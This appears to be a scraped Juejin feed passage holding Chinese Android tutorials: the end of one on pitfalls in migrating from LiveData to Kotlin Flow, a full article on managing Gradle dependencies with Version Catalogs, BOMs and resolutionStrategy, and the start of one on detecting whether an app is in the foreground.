<pre><code class="hljs language-javascript" lang="javascript">lifecycleScope.<span class="hljs-property">launch</span> { <span class="hljs-title function_">repeatOnLifecycle</span>(<span class="hljs-params">Lifecycle.State.STARTED</span>) { viewModel.<span class="hljs-property">flow</span>.<span class="hljs-property">collect</span> { ... } } }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>或者更常见的：</p>
<pre><code class="hljs language-scss" lang="scss">viewModel<span class="hljs-selector-class">.flow</span> <span class="hljs-selector-class">.flowWithLifecycle</span>(lifecycle, Lifecycle.State.STARTED) <span class="hljs-selector-class">.onEach</span> { ... } <span class="hljs-selector-class">.launchIn</span>(lifecycleScope)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p> <strong>结论</strong>：</p>
<blockquote>
<p>用 Flow，不手动处理生命周期 = 迟早踩坑</p>
</blockquote>
<hr/>
<h2 data-id="heading-10">坑三：事件被重复消费（Toast / 跳转 / Dialog）</h2>
<h3 data-id="heading-11">LiveData 时代</h3>
<p>我用的是：</p>
<ul>
<li>SingleLiveEvent</li>
<li>Event 包装类</li>
</ul>
<h3 data-id="heading-12">迁移到 Flow 后的天真想法</h3>
<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">eventFlow</span> = MutableStateFlow&lt;Event?&gt;(null)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>结果：</p>
<ul>
<li>旋转屏幕后，事件又执行了一次</li>
<li>页面重进，Toast 又弹了</li>
</ul>
<h3 data-id="heading-13">根因</h3>
<p><code>StateFlow</code> 会 <strong>重放最新值</strong>，<br/>
而 UI 事件本质是：<strong>只消费一次</strong>。</p>
<h3 data-id="heading-14">正确解法</h3>
<p>用 <code>SharedFlow</code>，明确语义：</p>
<pre><code class="hljs language-ini" lang="ini">
val <span class="hljs-attr">eventFlow</span> = MutableSharedFlow&lt;UiEvent&gt;( replay = <span class="hljs-number">0</span>, extraBufferCapacity = <span class="hljs-number">1</span> )
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>发送事件：</p>
<pre><code class="hljs language-scss" lang="scss">eventFlow<span class="hljs-selector-class">.tryEmit</span>(UiEvent.ShowToast)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>结论</strong>：</p>
<blockquote>
<p>状态 → StateFlow<br/>
事件 → SharedFlow<br/>
不要混用</p>
</blockquote>
<hr/>
<h2 data-id="heading-15">坑四：combine 后的“无意义 UI 刷新”</h2>
<h3 data-id="heading-16">场景</h3>
<p>多个数据源组合 UI：</p>
<p><code>combine(flowA, flowB) { a, b -&gt; UiState(a, b) }</code></p>
<h3 data-id="heading-17">问题</h3>
<ul>
<li>flowA 频繁变化</li>
<li>flowB 实际没变</li>
<li>UI 却每次都刷新</li>
</ul>
<h3 data-id="heading-18">原因</h3>
<p>Flow 不会帮你判断：</p>
<blockquote>
<p>“新值和旧值是否等价”</p>
</blockquote>
<h3 data-id="heading-19">解决方式</h3>
<p>在合适的地方加：</p>
<p><code>.distinctUntilChanged()</code></p>
<p>或者对组合后的 UiState 做 equals 控制。</p>
<p><strong>结论</strong>：</p>
<blockquote>
<p>Flow 很“诚实”，<br/>
你不拦，它就一直发</p>
</blockquote>
<hr/>
<h2 data-id="heading-20">坑五：在 Flow 里直接写耗时逻辑，线程炸了</h2>
<h3 data-id="heading-21">LiveData 时代的错觉</h3>
<p>以前 <code>postValue</code> 很少关心线程。</p>
<h3 data-id="heading-22">Flow 里我一开始的写法</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">flow</span> { <span class="hljs-built_in">emit</span>(repository.loadBigData()) }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>结果：</p>
<ul>
<li>collect 在 Main</li>
<li>上游也在 Main</li>
<li>UI 卡顿，甚至 ANR</li>
</ul>
<h3 data-id="heading-23">正确理解</h3>
<p>Flow 的线程 ≠ collect 的线程<br/>
<strong>上游执行在哪，全看你有没有切</strong></p>
<h3 data-id="heading-24">修正</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">flow</span> { <span class="hljs-built_in">emit</span>(repository.loadBigData()) }<span class="hljs-selector-class">.flowOn</span>(Dispatchers.IO)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p> <strong>结论</strong>：</p>
<blockquote>
<p>Flow 默认不帮你切线程<br/>
每个耗时点，都要显式思考调度器</p>
</blockquote>
<hr/>
<h2 data-id="heading-25">最后的整体认知变化</h2>
<p>迁移完成后，我对 LiveData 和 Flow 的理解是：</p>
<ul>
<li>LiveData：<strong>简单、保守、UI 友好</strong></li>
<li>Flow：<strong>强大、灵活，但需要你承担设计成本</strong></li>
</ul>
<p>如果项目：</p>
<ul>
<li>状态简单</li>
<li>数据源单一<br/>
LiveData 并不落后</li>
</ul>
<p>如果项目：</p>
<ul>
<li>多数据源</li>
<li>有组合 / 转换 / 背压需求<br/>
Flow 才是真正的优势区</li>
</ul>
<hr/>
<h2 data-id="heading-26">总结一句话</h2>
<blockquote>
<p><strong>LiveData → Flow，不是语法迁移，而是心智模型迁移。</strong></p>
</blockquote>
<p>如果你只是“为了用而用”，<br/>
Flow 反而会让系统更复杂。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[多模块架构下的依赖治理：如何避免 Gradle 依赖地狱]]></title>    <link>https://juejin.cn/post/7602931486599004195</link>    <guid>https://juejin.cn/post/7602931486599004195</guid>    <pubDate>2026-02-05T13:02:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602931486599004195" data-draft-id="7603183929251921972" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="多模块架构下的依赖治理：如何避免 Gradle 依赖地狱"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T13:02:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Fushize"/> <meta itemprop="url" content="https://juejin.cn/user/2367696439872411"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            多模块架构下的依赖治理：如何避免 Gradle 依赖地狱
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2367696439872411/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Fushize
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:02:22.000Z" title="Thu Feb 05 2026 13:02:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>随着项目业务的扩张，你把项目拆成了 <code>app</code>、<code>core</code>、<code>feature-login</code>、<code>feature-home</code> 等十几个模块。你觉得架构清晰了，解耦了，心里美滋滋。</p>
<p>直到有一天，App 突然崩溃，报错 <code>java.lang.NoSuchMethodError</code>，或者 <code>NoClassDefFoundError</code>。</p>
<p>排查了一下午，你发现：</p>
<ul>
<li><code>core</code> 模块依赖了 <code>OkHttp 4.9.0</code>。</li>
<li><code>feature-login</code> 模块偷偷依赖了 <code>OkHttp 3.12.0</code>。</li>
<li>Gradle 在打包时“自作聪明”地合并了版本，导致运行时找不到方法。</li>
</ul>
<p>这就是**“依赖地狱”（Dependency Hell）**。在多模块开发中，如果缺乏治理，<code>build.gradle</code> 文件很快就会变成一堆难以维护的“魔法数字”和冲突代码。</p>
<p>今天我们来聊聊，在 2026 年，如何优雅地治理 Android 依赖。</p>
<h3 data-id="heading-0">1. 放弃 <code>ext</code>，拥抱 Version Catalogs</h3>
<p>以前我们喜欢在根目录的 <code>build.gradle</code> 里写个 <code>ext</code> 代码块来管理版本号。后来有人用 <code>buildSrc</code>，虽然支持自动补全，但会导致每次修改版本号都触发全量编译（太慢了！）。</p>
<p>现在，Google 官方推荐的标准是 <strong>Version Catalogs (<code>libs.versions.toml</code>)</strong> 。</p>
<p>它的优势在于：</p>
<ul>
<li><strong>统一管理</strong>：所有版本号在一个 TOML 文件里，一目了然。</li>
<li><strong>性能好</strong>：修改版本号不会导致构建脚本重新编译。</li>
<li><strong>类型安全</strong>：在 Kotlin DSL 中可以直接点出来，不用背字符串。</li>
</ul>
<p><strong>实战配置 (<code>gradle/libs.versions.toml</code>):</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[versions]</span>
<span class="hljs-attr">kotlin</span> = <span class="hljs-string">"1.9.22"</span>
<span class="hljs-attr">retrofit</span> = <span class="hljs-string">"2.9.0"</span>
<span class="hljs-attr">okhttp</span> = <span class="hljs-string">"4.12.0"</span>

<span class="hljs-section">[libraries]</span>
<span class="hljs-attr">retrofit</span> = { module = <span class="hljs-string">"com.squareup.retrofit2:retrofit"</span>, version.ref = <span class="hljs-string">"retrofit"</span> }
<span class="hljs-attr">retrofit-gson</span> = { module = <span class="hljs-string">"com.squareup.retrofit2:converter-gson"</span>, version.ref = <span class="hljs-string">"retrofit"</span> }
<span class="hljs-attr">okhttp</span> = { module = <span class="hljs-string">"com.squareup.okhttp3:okhttp"</span>, version.ref = <span class="hljs-string">"okhttp"</span> }
<span class="hljs-attr">okhttp-logging</span> = { module = <span class="hljs-string">"com.squareup.okhttp3:logging-interceptor"</span>, version.ref = <span class="hljs-string">"okhttp"</span> }

<span class="hljs-section">[bundles]</span>
<span class="hljs-attr">networking</span> = [<span class="hljs-string">"retrofit"</span>, <span class="hljs-string">"retrofit-gson"</span>, <span class="hljs-string">"okhttp"</span>, <span class="hljs-string">"okhttp-logging"</span>]
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>在模块中使用：</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// app/build.gradle.kts</span>
dependencies {
    <span class="hljs-comment">// 以前：implementation("com.squareup.retrofit2:retrofit:2.9.0")</span>
    <span class="hljs-comment">// 现在：</span>
    <span class="hljs-built_in">implementation</span>(libs.bundles.networking) 
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>看，连依赖一整套网络库都只需要一行代码，而且绝对不会出现 <code>Retrofit</code> 和 <code>OkHttp</code> 版本不匹配的问题。</p>
<h3 data-id="heading-1">2. <code>api</code> vs <code>implementation</code>：守好你的大门</h3>
<p>这是多模块开发中最容易被忽视的细节，也是<strong>构建速度变慢</strong>的罪魁祸首。</p>
<ul>
<li><strong><code>implementation</code> (推荐)</strong> ：依赖只对当前模块可见。如果 <code>Library A</code> 修改了依赖，只有 A 会重新编译，依赖 A 的 <code>App</code> 模块不需要重新编译。</li>
<li><strong><code>api</code> (慎用)</strong> ：依赖会“泄漏”给上层模块。如果 <code>Library A</code> 用 <code>api</code> 依赖了 Gson，那么依赖 A 的 <code>App</code> 模块也能直接用 Gson。一旦 Gson 版本变了，整条链路都要重新编译。</li>
</ul>
<p><strong>治理原则：</strong> 除非你的模块是一个“聚合层”或者你的接口返回值直接暴露了第三方库的对象，否则<strong>律使用 <code>implementation</code></strong>。这能显著减少增量编译的时间。</p>
<h3 data-id="heading-2">3. 解决冲突的终极武器：BOM (Bill of Materials)</h3>
<p>当你的项目引入了 Firebase、Jetpack Compose 或者 OkHttp 全家桶时，经常遇到不同子库版本不一致的问题。</p>
<p>这时候，<strong>BOM</strong> 就是救星。BOM 是一个特殊的依赖，它不包含代码，只包含“版本清单”。你只需要依赖 BOM，然后引入子库时<strong>不需要写版本号</strong>。</p>
<pre><code class="hljs language-scss" lang="scss">dependencies {
    <span class="hljs-comment">// 引入 OkHttp 的 BOM</span>
    <span class="hljs-built_in">implementation</span>(platform("com.squareup.okhttp3:okhttp-bom:<span class="hljs-number">4.12</span>.<span class="hljs-number">0</span>"))

    <span class="hljs-comment">// 下面这些都不需要写版本号，BOM 会自动保证它们版本一致且兼容</span>
    <span class="hljs-built_in">implementation</span>("com.squareup.okhttp3:okhttp")
    <span class="hljs-built_in">implementation</span>("com.squareup.okhttp3:logging-interceptor")
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这样，你永远不用担心 <code>logging-interceptor</code> 的版本和 <code>okhttp</code> 主体版本打架了。</p>
<h3 data-id="heading-3">4. 强制统一版本（ResolutionStrategy）</h3>
<p>有时候，第三方库 A 依赖了 <code>Gson 2.8</code>，第三方库 B 依赖了 <code>Gson 2.10</code>。虽然 Gradle 默认会选高的，但有时候你想<strong>强制</strong>所有模块都用同一个版本，防止意外。</p>
<p>在根目录的 <code>build.gradle.kts</code> 中，你可以加一把“全局锁”：</p>
<pre><code class="hljs language-scss" lang="scss">allprojects {
    configurations<span class="hljs-selector-class">.all</span> {
        resolutionStrategy {
            <span class="hljs-comment">// 强制所有模块的 Gson 都使用 2.10.1</span>
            <span class="hljs-built_in">force</span>("com.google.code.gson:gson:<span class="hljs-number">2.10</span>.<span class="hljs-number">1</span>")
            
            <span class="hljs-comment">// 或者，如果遇到冲突直接报错，强迫开发者去解决（适合严格的项目）</span>
            <span class="hljs-comment">// failOnVersionConflict()</span>
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-4">5. 定期体检：Dependency Analysis Plugin</h3>
<p>即使有了上面的手段，随着时间推移，项目里还是会堆积很多不再使用的垃圾依赖。</p>
<p>推荐一个神器插件：<strong>Dependency Analysis Gradle Plugin</strong> (by Tony Robalik)。</p>
<p>它能帮你找出：</p>
<ol>
<li><strong>Unused dependencies</strong>：声明了但没用的依赖（删掉减体积！）。</li>
<li><strong>Transitive dependencies used</strong>：你用了某个库，但没显式声明（比如你用了 Retrofit 带来的 OkHttp，但没在 gradle 里写 OkHttp）。这很危险，一旦 Retrofit 升级去掉了 OkHttp，你代码就红了。</li>
<li><strong>Wrong scope</strong>：该用 <code>implementation</code> 的你用了 <code>api</code>。</li>
</ol>
<p><strong>使用方法：</strong> 跑一下 <code>./gradlew buildHealth</code>，它会生成一份详尽的 HTML 报告，教你如何精简 <code>build.gradle</code>。</p>
<h3 data-id="heading-5">总结</h3>
<p>依赖治理不仅仅是为了“编译通过”，更是为了项目的长治久安。</p>
<ol>
<li><strong>标准化</strong>：全线迁移到 <strong>Version Catalogs (TOML)</strong> 。</li>
<li><strong>隔离化</strong>：严控 <code>api</code> 使用，默认为 <code>implementation</code>。</li>
<li><strong>一致化</strong>：善用 <strong>BOM</strong> 和 <code>resolutionStrategy</code> 解决版本冲突。</li>
<li><strong>自动化</strong>：定期用插件扫描“僵尸依赖”。</li>
</ol>
<p>把这些做好了，你会发现你的 Android 项目就像打理好的花园一样，清爽、稳定、构建飞快。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[精准判断Android应用前后台状态：原理、实践与避坑指南]]></title>    <link>https://juejin.cn/post/7602965400809783346</link>    <guid>https://juejin.cn/post/7602965400809783346</guid>    <pubDate>2026-02-05T12:16:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602965400809783346" data-draft-id="7602982045139042350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="精准判断Android应用前后台状态：原理、实践与避坑指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T12:16:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小码哥_常"/> <meta itemprop="url" content="https://juejin.cn/user/705230023172650"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            精准判断Android应用前后台状态：原理、实践与避坑指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/705230023172650/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小码哥_常
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:16:20.000Z" title="Thu Feb 05 2026 12:16:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在Android开发中，准确判断应用整体处于<strong>前台（用户可见交互）</strong> 还是<strong>后台（完全不可见）</strong> 是许多核心业务的关键前提：<br/>
✅ 推送策略优化（避免后台频繁唤醒）<br/>
✅ 资源调度（暂停视频/定位/传感器）<br/>
✅ 用户行为分析（使用时长统计）<br/>
✅ 安全敏感操作（如支付前校验）</p>
<p>然而，由于Android系统演进、厂商定制、多进程等复杂因素，<strong>“看似简单”的判断实则陷阱重重</strong>。本文将系统梳理可靠方案，助你避开90%的坑。</p>
<hr/>
<h2 data-id="heading-0">一、常见误区与过时方案（请绕行！）</h2>






























<table><thead><tr><th>方法</th><th>问题</th><th>状态</th></tr></thead><tbody><tr><td><code>ActivityManager.getRunningTasks()</code></td><td>API 21+ 需<code>GET_TASKS</code>权限，返回结果被系统限制，<strong>完全不可靠</strong></td><td>❌ 已废弃</td></tr><tr><td><code>ActivityManager.getRunningAppProcesses()</code></td><td>API 29+ 仅返回自身进程，无法判断前台状态；需<code>PACKAGE_USAGE_STATS</code>权限</td><td>❌ 不推荐</td></tr><tr><td>单Activity生命周期监听</td><td>多Activity场景下（如DialogActivity、透明Activity），计数易错乱</td><td>⚠️ 局限性大</td></tr><tr><td><code>UsageStatsManager</code></td><td>需用户手动授权“使用情况访问”，存在延迟，隐私敏感</td><td>⚠️ 仅作备选</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>核心认知</strong>：判断“应用级”前后台 ≠ 判断“单个Activity”状态。需关注<strong>整个应用进程是否有可见窗口</strong>。</p>
</blockquote>
<hr/>
